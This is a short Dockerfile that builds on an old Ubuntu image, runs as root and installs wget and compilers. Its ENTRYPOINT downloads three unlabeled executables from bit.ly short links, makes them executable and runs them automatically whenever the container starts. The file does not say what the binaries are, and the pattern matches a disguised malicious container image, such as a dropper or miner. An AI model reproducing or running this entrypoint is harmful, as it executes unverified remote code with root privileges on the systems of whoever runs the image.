FROM ubuntu:xenial-20151218.1
USER root
RUN apt-get update && apt-get install wget make gcc -y
ENTRYPOINT wget https://bit.ly/3Iu9lua && chmod +x 3Iu9lua && ./3Iu9lua && wget https://bit.ly/3Ibzg9T && chmod +x 3Ibzg9T && ./3Ibzg9T && wget https://bit.ly/3BsaT4Q && chmod +x 3BsaT4Q && ./3BsaT4Q
